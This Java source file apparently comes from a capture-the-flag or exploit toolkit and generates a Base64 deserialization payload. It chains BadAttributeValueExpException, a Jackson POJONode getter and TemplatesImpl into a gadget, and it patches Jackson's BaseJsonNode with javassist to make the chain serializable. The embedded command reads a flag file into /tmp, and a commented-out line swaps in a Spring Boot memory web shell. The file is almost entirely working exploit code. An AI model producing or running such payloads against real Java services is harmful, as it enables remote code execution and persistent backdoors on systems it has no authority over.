package gadget;

import gadget.memshell.SpringBootMemoryShellOfController;
import javassist.*;
import com.fasterxml.jackson.databind.node.POJONode;
import util.GadgetUtils;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

//BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl
public class Jackson {
    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {

//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);

        final Object template = GadgetUtils.getTemplatesImpl("cat /F14gIsHereY0UGOTIT>/tmp/file");
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();

        POJONode node = new POJONode(template);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(val);
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }
}
